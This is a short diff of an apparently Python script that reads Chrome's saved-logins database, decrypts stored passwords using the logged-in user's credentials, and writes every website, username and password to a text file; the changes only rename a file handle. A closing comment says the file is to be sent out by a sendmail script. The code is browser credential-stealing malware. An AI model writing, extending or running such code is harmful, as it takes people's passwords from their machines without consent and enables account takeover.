@@ -15,10 +15,10 @@ connection = conn.cursor()
 conn.execute("PRAGMA busy_timeout = 300000")
 connection.execute('Select action_url, username_value, password_value FROM logins')
 # make the file
-fp = open(r"Chromepass.txt", "a+")
+f = open("Chromepass.txt", "a+")
 
 # we write to the file
-fp.write("Chrome Saved Passwords\n")
+f.write("Chrome Saved Passwords\n")
 
 #Here the Crpyunprotectdata module comes into play. It decrypts the dtaa with the login credentials of the logged in user.
 for result in connection.fetchall():
@@ -27,9 +27,9 @@ for result in connection.fetchall():
 
     if password:
 
-        fp.write('\nWebsite: '+result[0])
-        fp.write('\nUsername: '+result[1])
-        fp.write('\nPassword: ' + str(password))
+        f.write('\nWebsite: '+result[0])
+        f.write('\nUsername: '+result[1])
+        f.write('\nPassword: ' + str(password))
 
 
     ## lets send the file now, rune the sendmail script
